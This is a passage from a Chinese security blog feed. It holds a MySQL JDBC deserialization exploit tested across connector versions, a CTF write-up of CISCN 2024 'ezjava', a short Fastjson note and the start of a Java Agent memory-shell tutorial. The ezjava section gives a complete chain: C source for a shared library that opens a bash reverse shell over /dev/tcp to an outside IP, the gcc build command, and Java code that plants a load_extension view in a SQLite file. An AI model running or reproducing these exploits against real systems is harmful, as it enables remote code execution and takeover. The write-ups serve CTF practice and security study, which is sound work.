id="8-x-x"><a href="#8-x-x" class="headerlink" title="8.x.x"></a>8.x.x</h4><p>buildCollationMapping:920, NativeSession中</p><p>ResultSet采用了NativeResultset类，已经不是ResultSetImpl，后续的链子也就断了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">buildCollationMapping:<span class="number">920</span>, NativeSession (com.mysql.cj)</span><br><span class="line">initializePropsFromServer:<span class="number">1311</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">966</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">createNewIO:<span class="number">825</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">455</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">getInstance:<span class="number">240</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connect:<span class="number">207</span>, NonRegisteringDriver (com.mysql.cj.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">14</span>, detectCustomCollations_Demo (org.example.MySQLJDBCAttackDemo)</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412262339559.png" alt="image-20241226233805524"></p><h4 id="5-1-49"><a href="#5-1-49" class="headerlink" title="5.1.49"></a>5.1.49</h4><p>直接不调用resultSeToMap，没有getObject，所以无了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427660.png" alt="image-20241226235555251"></p><h4 id="5-1-41-5-1-48"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h4><p>测试版本：5.1.45</p><p>payload还是之前那样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line">Class.forName(driver);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure><p>但是报错了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427664.png" alt="image-20241227111715181"></p><p>调用堆栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">getObjectDeserializingIfNeeded:<span class="number">4569</span>, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">getObject:<span class="number">4539</span>, ResultSetImpl (com.mysql.jdbc)</span><br><span class="line">buildCollationMapping:<span class="number">921</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">3236</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">2232</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:<span class="number">2014</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">776</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">47</span>, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">408</span>, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:<span class="number">425</span>, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:<span class="number">386</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:<span class="number">330</span>, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">23</span>, detectCustomCollations_Demo (org.example.MySQLJDBCAttackDemo)</span><br></pre></td></tr></table></figure><p>我们跟进一下代码，不难发现getObject硬编码指定了索引</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271425559.png" alt="image-20241227111900584"></p><p><code>[50,51,51,51]</code> 对应于<code>server.py</code>中的<code>2333</code></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271425496.png" alt="image-20241227111007184"></p><p>所以去改改server.py的第三个位置为content，即可打反序列化</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271425457.png" alt="image-20241227115515967"></p><p>成功！</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271425223.png" alt="image-20241227115544955"></p><h4 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29 - 5.1.40"></a>5.1.29 - 5.1.40</h4><p>测试版本：5.1.35</p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line">Class.forName(driver);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure><p>调用堆栈如图</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271425420.png" alt="image-20241227141758429"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">resultSetToMap:<span class="number">458</span>, Util (com.mysql.jdbc)</span><br><span class="line">buildCollationMapping:<span class="number">947</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">3282</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">2283</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:<span class="number">2069</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">794</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">44</span>, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">408</span>, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:<span class="number">389</span>, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:<span class="number">399</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:<span class="number">325</span>, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">16</span>, detectCustomCollations_Demo (org.example.MySQLJDBCAttackDemo)</span><br></pre></td></tr></table></figure><h4 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19-5.1.28"></a>5.1.19-5.1.28</h4><p>测试版本：5.1.25</p><p>payload同，调用堆栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">resultSetToMap:<span class="number">507</span>, Util (com.mysql.jdbc)</span><br><span class="line">buildCollationMapping:<span class="number">1004</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">3590</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">2531</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:<span class="number">2301</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">834</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">47</span>, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">408</span>, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:<span class="number">411</span>, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:<span class="number">416</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:<span class="number">346</span>, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">16</span>, detectCustomCollations_Demo (org.example.MySQLJDBCAttackDemo)</span><br></pre></td></tr></table></figure><h4 id="5-1-19以下"><a href="#5-1-19以下" class="headerlink" title="5.1.19以下"></a>5.1.19以下</h4><p>哈哈没有getObject，链子断了无了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271425623.png" alt="image-20241227142513181"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整理一下Java的CTF题</title>
      <link href="/2024/12/27/WebExploit/Java/java%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/12/27/WebExploit/Java/java%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Java赛题复现"><a href="#Java赛题复现" class="headerlink" title="Java赛题复现"></a>Java赛题复现</h1><h2 id="2024年-CISCN-ezjava"><a href="#2024年-CISCN-ezjava" class="headerlink" title="2024年 CISCN ezjava"></a>2024年 CISCN ezjava</h2><p>考点：JDBC Sqlite攻击 + load extension</p><p>调试</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301439956.png" alt="image-20241224171141992"></p><p>加载数据库驱动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] testDatasourceConnectionAble(JdbcBean jdbcBean) <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">DatasourceLoadConfig</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.datasourceLoadConfig;</span><br><span class="line">    Map&lt;String, String&gt; config = DatasourceLoadConfig.getConfig();</span><br><span class="line">    <span class="keyword">switch</span> (jdbcBean.getType()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">// 动态加载 MySQL 数据库的 JDBC 驱动程序类</span></span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-MYSQL&quot;</span>));</span><br><span class="line">            <span class="type">MysqlDatasourceConnector</span> <span class="variable">mysqlDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MysqlDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> mysqlDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-POSTGRES&quot;</span>));</span><br><span class="line">            <span class="type">PostgresDatasourceConnector</span> <span class="variable">postgresDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PostgresDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> postgresDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="type">SqliteDatasourceConnector</span> <span class="variable">sqliteDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqliteDatasourceConnector</span>(jdbcBean.getUrl());</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sqliteDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-SQLITE&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>MySQL：加载的是<code>com.mysql.jdbc.Driver</code>，虽然是<code>8.0.13</code>但是打不了</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301439182.png" alt="image-20241227170355065"></p><p>开了LoadExtension，可以利用load_extension加载恶意so文件</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301439922.png" alt="image-20241227220003393"></p><p>so怎么上传到靶机里？这里就要借用一下<a href="https://xz.aliyun.com/t/15884?time__1311=GqjxnDgQiQi==GNDQ0PBK0Q=lb957DR7WoD#toc-2%E7%9A%84%E6%80%9D%E8%B7%AF%E4%BA%86%E3%80%82">https://xz.aliyun.com/t/15884?time__1311=GqjxnDgQiQi%3D%3DGNDQ0PBK0Q%3Dlb957DR7WoD#toc-2的思路了。</a></p><p>我们注意到此处会缓存一份resourceAddr地址处的文件</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301440551.png" alt="image-20241230142757767"></p><p>所以缓存so</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:sqlite::resource:http://ip:port/exp.so</span><br></pre></td></tr></table></figure><p>so生成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void flag() &#123;&#123;</span><br><span class="line">    system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.30.144.1/6666 &lt;&amp;1&#x27;&quot;);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line">void space() &#123;&#123;</span><br><span class="line">    // this just exists so the resulting binary is &gt; 500kB</span><br><span class="line">         static char waste[500 * 1024] = &#123;&#123;2&#125;&#125;;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后在linux下gcc生成so：<code>gcc -shared -fPIC exp.c -o exp.so</code></p><p>db文件生成，嵌入一个预编译语句来加载so</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.SqliteJDBCAttackDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenDB</span> &#123;</span><br><span class="line">    <span class="comment">// 直接加载本地数据库文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dbFile</span> <span class="operator">=</span> <span class="string">&quot;poc.db&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dbFile);</span><br><span class="line">            Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite:&quot;</span>+dbFile);</span><br><span class="line">            System.out.println(<span class="string">&quot;Opened database successfully&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE VIEW security as SELECT ( SELECT load_extension(&#x27;/tmp/sqlite-jdbc-tmp-364689982.db&#x27;,&#x27;flag&#x27;));&quot;</span>;  <span class="comment">//向其中插入传入的三个参数</span></span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">preStmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            preStmt.executeUpdate();</span><br><span class="line">            preStmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就是依次发包，先缓存so：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301440015.png" alt="image-20241230143203694"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301440117.png" alt="image-20241230143239162"></p><p>然后访问db，会执行预置的sqlite语句然后加载so成功反弹shell</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301439260.png" alt="image-20241230143310864"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412301439233.png" alt="image-20241230143320796"></p><h2 id="2023年-西湖论剑-easy-api"><a href="#2023年-西湖论剑-easy-api" class="headerlink" title="2023年 西湖论剑 easy_api"></a>2023年 西湖论剑 easy_api</h2><p>考点：Jetty路由绕过，Fastjson1.2.48 toString打法</p><p>路由绕过：</p><p><a href="https://blog.csdn.net/z69183787/article/details/84848751">https://blog.csdn.net/z69183787/article/details/84848751</a></p><p>明晃晃的readObject，lib下查看fastjson版本为1.2.48可以打</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202501082205398.png" alt="image-20250108220532332"></p><p>调试过程：<a href="https://1cfh.fun/2025/01/02/WebExploit/Java/FastjsonVuln/">https://1cfh.fun/2025/01/02/WebExploit/Java/FastjsonVuln/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Agent 内存马</title>
      <link href="/2024/12/24/WebExploit/Java/memshell-JavaAgent/"/>
      <url>/2024/12/24/WebExploit/Java/memshell-JavaAgent/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Agent-内存马学习记录"><a href="#Java-Agent-内存马学习记录" class="headerlink" title="Java Agent 内存马学习记录"></a>Java Agent 内存马学习记录</h1><h2 id="Java-Agent使用"><a href="#Java-Agent使用" class="headerlink" title="Java Agent使用"></a>Java Agent使用</h2><blockquote><p>Java Agent：不影响正常编译的前提下，修改Java字节码，进而动态修改已加载或未加载的类、属性、方法的技术</p><p>应用：热部署、诊断工具</p></blockquote><p>Java Agent的两种使用方式：</p><ul><li>通过<code>-javaagent</code>参数指定agent，从而在JVM启动之前修改class内容（自JDK1.5）</li><li>通过<code>VirtualMachine.attach</code>方法，将agent附加在启动后的JVM进程中，进而动态修改class内容（自JDK1.6）</li></ul><p>上述两种方法分别需要实现<code>premain</code>和<code>agentmain</code>方法</p><p>方法的原型如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span>;</span><br></pre></td></tr></table></figure><p>其中带有 <code>Instrumentation inst</code> 参数的方法优先级更高, 会优先被调用</p><h2 id="打jar包"><a href="#打jar包" class="headerlink" title="打jar包"></a>打jar包</h2><p>Java Agent程序必须打包成为jar格式</p><p>同时在jar包中需要提供一个<code>MANIFEST.MF</code>文件来配置Java Agent的相关参数</p><p>IDEA下的相关操作如下：</p><ul><li>项目结构中选定工件</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412241144771.png" alt="image-20241219220511028"></p><ul><li>在resources下会生成META-INF&#x2F;MANIFEST.MF</li></ul><p>在这里可以指定premain类和agentmain类（该文件中最后有一个空行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: com.example.memshell.premainDemo</span><br><span class="line">Agent-Class: com.example.memshell.agentmainDemo</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>构建指定工件</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412241144786.png" alt="image-20241219221102192"></p><h2 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h2><p>premain是在在JVM加载字节码之前调用</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412192203273.png" alt="image-20241219220328556"></p><p>premain项目</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.memshell;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">premainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;premainDemo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另起一个java项目，在构建中记得添加JVM选项（不同于程序参数），添加<code>-javaagent</code>选项，指定premain的jar包的绝对路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:E:\Java_Sec\MemShell\out\artifacts\MemShell_jar\MemShell.jar</span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412241144085.png" alt="image-20241219221241714"></p><p>运行程序可得</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412241145807.png" alt="image-20241219221402670"></p><h2 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h2><p>agentmain方法是在JVM启动后，将自定义进程附加到JVM的已知进程中</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412192221318.jpg" alt="agentmain"></p><p>我们需要手动导入一下<code>com.sun.tools.attach.VirtualMachine</code>这个类，位于jdk的lib目录下的tools.jar，但是这个jar包默认下不在JDK的classpath目录下</p><p><img 